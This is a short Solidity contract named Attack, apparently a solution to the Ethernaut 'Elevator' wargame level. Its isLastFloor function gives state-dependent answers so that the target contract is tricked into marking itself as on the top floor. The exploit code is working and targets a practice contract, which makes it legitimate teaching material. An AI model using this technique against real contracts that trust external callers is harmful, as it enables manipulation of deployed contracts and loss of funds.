// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256) external;
    function floor() external view returns(uint256);
}

contract Attack {
    Elevator elevator;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function solver() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint256 _fl) view  public returns (bool) {
        if (elevator.floor() == _fl) {
            return true;
        } else {
            return false;
        }
    }
}